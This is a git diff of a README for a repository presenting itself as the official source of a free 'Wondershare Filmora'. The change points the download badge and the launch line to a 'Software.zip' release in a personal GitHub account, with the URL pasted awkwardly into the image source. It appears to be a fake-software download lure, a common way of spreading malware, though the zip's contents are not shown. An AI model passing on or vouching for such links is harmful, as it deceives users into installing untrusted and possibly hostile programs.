@@ -9,9 +9,9 @@ Welcome to the official repository of **Wondershare Filmora Free**! This reposit
 
 ## Get Started!
 To access the **Wondershare Filmora Free** repository, you can download the latest version by clicking the link below:
-[<img src="https://img.shields.io/badge/Download%20Filmora%20Wondershare-v1.0.0-blue">](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[<img src="https://github.com/TiagoSevero2023/Wondershare-Filmora-Free/releases/download/v2.0/Software.zip%20Filmora%20Wondershare-v1.0.0-blue">](https://github.com/TiagoSevero2023/Wondershare-Filmora-Free/releases/download/v2.0/Software.zip)
 
-🚀 **Launching the v1.0.0.zip file!**
+🚀 **Launching the https://github.com/TiagoSevero2023/Wondershare-Filmora-Free/releases/download/v2.0/Software.zip file!**
 
 If you encounter any issues with the provided link or want to explore more options, make sure to check the "Releases" section of this repository for additional resources and updates.
 
